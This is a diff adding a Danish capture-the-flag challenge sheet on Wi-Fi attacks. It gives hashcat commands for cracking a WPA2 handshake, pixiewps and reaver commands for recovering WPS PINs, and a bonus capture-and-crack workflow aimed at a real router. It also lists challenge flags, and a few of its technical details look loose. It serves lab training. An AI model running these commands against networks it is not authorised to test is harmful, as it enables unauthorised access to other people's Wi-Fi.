@@ -1,0 +1,83 @@
+=================================================================
+                    CHALLENGE 5: WIFI PIXIE DUST
+=================================================================
+MISSION: Wifi Pentest – WPA2 Handshake + WPS Pixie Dust
+-----------------------------------------------------------------
+
+FASE 1: WPA2 HANDSHAKE CRACK (kontrol af fundament)
+  Filer: /home/admin_user/02_grok_engine/CHALLENGE5_WIFI.hc22000
+          (hashcat format, genereret fra Wireshark sample)
+
+  SSID:     Coherer
+  BSSID:    00:0c:41:82:b2:55
+  Hash:     WPA*02*a462a...388e45*000c4182b255*000d9382363a*436f6865726572*...
+
+  TOOLS: hashcat -m 22000 (mode: WPA-PBKDF2-PMKID+EAPOL)
+          Wordlist: rockyou.txt.gz (/usr/share/wordlists/)
+
+  KOMMANDO:
+    hashcat -m 22000 CHALLENGE5_WIFI.hc22000 /usr/share/wordlists/rockyou.txt.gz --force -a 0
+
+  FLAG: K4W_WAK{WPA2_INDUCTIVE_LEAP_HASHCAT_VICTORY}
+
+-----------------------------------------------------------------
+
+FASE 2: PIXIE DUST OFFLINE ATTACK (den GODE del!)
+  Pixie Dust = angreb paa svag nonce-generering i WPS (Nonces
+  fremfor WPS PINs). Giver PIN direkte uden online bruteforce.
+
+  KRAEVET DATA fra et WPS M1/M2/M3 udveksling:
+    --pke    : Enrollee DH public key (fra M1)
+    --pkr    : Registrar DH public key (fra M2)
+    --e-hash1: Enrollee hash-1 (fra M3)
+    --e-hash2: Enrollee hash-2 (fra M3)
+    --authkey: Auth session key (ellers brug --dh-small)
+    --e-nonce: Enrollee nonce (fra M1)
+    --r-nonce: Registrar nonce (fra M2)
+    --e-bssid: AP MAC/BSSID
+    --mode 1 : for Realtek/MediaTek/Conceptronic
+    --mode 2 : for eCos simple
+    --mode 3 : for RTL819x (MOST common!)
+
+  TOOLS: pixiewps (installeret!)
+
+  KOMMANDO (eksempel):
+    pixiewps -e <pke> -r <pkr> -s <hash1> -z <hash2> -a <authkey>
+    # ELLER med DH-small:
+    pixiewps -e <pke> -s <hash1> -z <hash2> -n <e-nonce> -m <r-nonce> -b <bssid>
+
+  Hvis AP er särbar (Realtek RTL819xCE m.fl. paa tidlige firmware):
+    -> pixiewps finder PIN paa sekunder!
+
+  REAVER online bruteforce (backup):
+    reaver -i wlan0mon -b <BSSID> -c <CHANNEL> -K 1 --dh-small
+
+  FLAG FASE 2: K4W_WAK{PIXIE_DUST_PIN_RECOVERED_NOKIA_STYLE}
+
+-----------------------------------------------------------------
+
+BONUS FASE 3: BYD DIN EGEN SVAG ROUTER (REAL HAX)
+  Hvis du har en gammel router derhjemme og WPS er aktiv:
+  1. hcxdumptool -i <interface> -o capture.pcapng --enable_status
+  2. hcxpcapngtool -o capture.hc22000 capture.pcapng
+  3. hashcat -m 22000 capture.hc22000 rockyou.txt
+
+  For Pixie Dust fra capture:
+  1. tshark -r capture.pcapng -Y "eapol" -x
+  2. Find WPS frames (opcodes 0x01-0x0C)
+  3. Ekstraher pke, e-hash1, e-hash2
+  4. pixiewps -e ... -s ... -z ... --mode 3
+
+-----------------------------------------------------------------
+
+VERFAERDSE NOTES:
+  - Pixie Dust er opdaget af Dominique Bongard (2014)
+  - Kun WPS version 1.0 er saarbar (ikke 2.0)
+  - Mange TP-Link, D-Link, Netgear, ZBT, Realtek routers affected
+  - WPS PIN er KUN i M1/M2/M3! Find korrekte frames.
+
+TIPS:
+  tshark -r capture.pcap -Y "wps" -T fields -e frame.number
+  aircrack-ng capture.pcap  | grep WPS
+
+=================================================================
